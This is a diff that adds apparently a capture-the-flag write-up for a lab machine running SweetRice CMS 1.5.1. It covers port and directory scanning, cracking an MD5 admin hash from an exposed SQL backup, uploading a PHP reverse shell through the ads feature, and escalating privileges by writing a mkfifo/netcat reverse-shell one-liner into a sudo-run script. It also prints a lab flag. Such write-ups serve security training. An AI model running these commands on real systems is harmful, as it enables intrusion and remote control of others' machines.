@@ -1,0 +1,92 @@
+>> nmap 10.10.137.31
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+
+>> gobuster dir -u http://10.10.137.31 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+
+/content (Status: 301)
+http://10.10.137.31/content/
+
+##
+Welcome to SweetRice - Thank your for install SweetRice as your website management system.
+This site is building now , please come late.
+
+If you are the webmaster,please go to Dashboard -> General -> Website setting
+
+and uncheck the checkbox "Site close" to open your website.
+More help at Tip for Basic CMS SweetRice installed
+##
+
+>> gobuster dir -u http://10.10.137.31/content/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x html,php,htaccess,php5
+
+/images (Status: 301)
+/index.php (Status: 200)
+/as (Status: 301)
+/js (Status: 301)
+/inc (Status: 301)
+/_themes (Status: 301)
+
+>> http://10.10.137.31/content/inc/mysql_backup/
+
+>> wget http://10.10.137.31/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql
+
+> Searched for 'admin' and found the following line:
+s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb
+
+> hashidentifier : 42f749ade7f9e195bf475f37a44cafcb
+Its MD5
+>> https://10015.io/tools/md5-encrypt-decrypt
+42f749ade7f9e195bf475f37a44cafcb : Password123
+
+>> http://10.10.137.31/content/as/
+username: manager
+password: Password123
+Current version : 1.5.1
+
+>> searchsploit sweetrice 1.5.1
+https://www.exploit-db.com/exploits/40700 
+# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
+PHP Codes In Ads File
+>> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+Ads name:
+reverse_shell.php
+
+Ads code:
+-------php-reverse-shell copied, pasted and edited to connect port 3434--------
+
+>> nc -lvnp 3434
+
+>> http://10.10.137.31/content/inc/ads/
+
+Clicked the php file and boom, I am in.
+
+>> cat user.txt
+THM{63e5bce9271952aad1113b6f1ac28a07}
+
+### Upgrade the shell ###
+>> python -c ‘import pty;pty.spawn(“/bin/bash”)’
+
+>> sudo -l
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+
+>> cat /home/itguy/backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+>> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.221.223 2323 >/tmp/f" > /etc/copy.sh
+
+>> sudo /usr/bin/perl /home/itguy/backup.pl
+
+
+
+
+
+
+
+
